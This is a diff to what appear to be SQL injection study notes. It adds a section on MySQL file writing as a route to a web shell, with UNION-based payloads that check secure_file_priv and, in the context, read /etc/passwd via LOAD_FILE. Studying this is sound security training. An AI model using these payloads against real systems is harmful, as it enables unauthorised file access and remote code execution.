@@ -881,6 +881,7 @@ As a result, the attacker is able to extract sensitive credential data directly 
 In MySQL, users require the `FILE` privilege to read files from the underlying filesystem. Files are read using the `LOAD_FILE()` function, which loads the contents of a file into the result set of a query.
 
 **Step 1: Fingerprint the User** 
+
 To fingerprint the user, any of the following payloads can be utilized:
 
 ```sql
@@ -955,3 +956,44 @@ cn' UNION SELECT 1, LOAD_FILE('/etc/passwd'), 3, 4--
 ---
 
 ## Writing Files
+
+Being able to write files to a back-end database, may enable an attacker to upload a web shell and gain remote code execution. Modern DBMSs disable `file-write` by default.
+
+On MySQL, three things are required to write files to the back-end database:
+
+- `FILE` privileges
+- `secure_file_priv` must be disables
+- Write access to the specific location
+
+In the previous section (Reading Files), user privileges were enumerated and we discovered that our user has `FILE` privileges.
+
+The next step is checking the `secure_file_priv` variable. The different scenarios are:
+
+- Empty value - can read/write from entire filesystem
+- Specific directory - can read/write from this directory
+- NULL - cannot read/write from anywhere
+
+Global variables are stored in the `INFORMATION_SCHEMA` database in a table called `GLOBAL_VARIABLES`. This table has two columns called `variable_name` and `variable_value`. 
+
+The following payload can be utilized to retrieve data from the `GLOBAL_VARIABLES` table:
+
+```sql
+-- Query
+SELECT variable_name, variable_value FROM INFORMATION_SCHEMA.GLOBAL_VARIABLES;
+```
+
+```sql
+-- Payload
+cn' UNION SELECT 1, variable_name, variable_value, 4 FROM INFORMATION_SCHEMA.GLOBAL_VARIABLES--  
+```
+
+The above payload can be refined to specify the exact variable to pull from the `GLOBAL_VARIABLES` table:
+
+```sql
+-- Payload
+cn' UNION SELECT 1, variable_name, variable_value, 4 FROM INFORMATION_SCHEMA.GLOBAL_VARIABLES WHERE variable_name='secure_file_priv'--   
+```
+
+![Filtered output](images/secure-file-priv.png)
+
+The variable value is empty, indicating that we can read/write across the entire filesystem.
